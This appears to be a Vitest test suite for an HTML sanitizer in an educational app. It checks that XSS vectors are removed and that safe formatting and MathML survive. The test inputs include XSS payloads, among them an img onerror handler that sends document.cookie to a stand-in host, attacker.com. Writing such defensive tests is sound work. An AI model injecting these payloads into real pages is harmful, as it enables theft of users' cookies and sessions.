// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from '../src/shared/security/sanitizer';

describe('SEC-01: HTML Sanitizer & XSS Defense Suite', () => {
  it('should neutralize malicious <script> tags', () => {
    const dirty = '<p>Tính giá trị biểu thức: <script>alert("hacked")</script></p>';
    const cleaned = sanitizeHtml(dirty);
    expect(cleaned).not.toContain('<script>');
    expect(cleaned).not.toContain('alert("hacked")');
    expect(cleaned).toContain('<p>Tính giá trị biểu thức: </p>');
  });

  it('should strip inline onerror attribute from <img> payloads', () => {
    const dirty = '<img src="invalid-image.png" onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">';
    const cleaned = sanitizeHtml(dirty);
    expect(cleaned).not.toContain('onerror');
    expect(cleaned).not.toContain('attacker.com');
    expect(cleaned).toContain('<img');
  });

  it('should strip inline onclick and onmouseover handlers', () => {
    const dirty = '<button onclick="evilAction()" onmouseover="stealToken()">Click me</button>';
    const cleaned = sanitizeHtml(dirty);
    expect(cleaned).not.toContain('onclick');
    expect(cleaned).not.toContain('onmouseover');
    expect(cleaned).not.toContain('evilAction');
    expect(cleaned).toContain('<button>Click me</button>');
  });

  it('should eliminate javascript: pseudoprotocol URLs in hyperlinks', () => {
    const dirty = '<a href="javascript:alert(1)">Click to view diagram</a>';
    const cleaned = sanitizeHtml(dirty);
    expect(cleaned).not.toContain('javascript:alert(1)');
  });

  it('should preserve safe EdTech educational formatting tags and attributes', () => {
    const safeHtml =
      '<div class="question-pane" id="q-pane-1"><p>Cho hình thang <strong>ABCD</strong>:</p><pre><code>let x = 10;</code></pre><table class="table-grid"><tbody><tr><td>1</td><td>2</td></tr></tbody></table></div>';
    const cleaned = sanitizeHtml(safeHtml);
    expect(cleaned).toContain('class="question-pane"');
    expect(cleaned).toContain('id="q-pane-1"');
    expect(cleaned).toContain('<strong>ABCD</strong>');
    expect(cleaned).toContain('<code>let x = 10;</code>');
    expect(cleaned).toContain('<table class="table-grid">');
  });

  it('should preserve KaTeX and MathML mathematical structures', () => {
    const mathHtml =
      '<span class="katex-inline"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow></math></span>';
    const cleaned = sanitizeHtml(mathHtml);
    expect(cleaned).toContain('<math');
    expect(cleaned).toContain('<mrow>');
    expect(cleaned).toContain('<mi>x</mi>');
    expect(cleaned).toContain('<mo>+</mo>');
  });

  it('should safely handle empty or nullish strings without errors', () => {
    expect(sanitizeHtml('')).toBe('');
    expect(sanitizeHtml(null as unknown as string)).toBe('');
    expect(sanitizeHtml(undefined as unknown as string)).toBe('');
  });
});
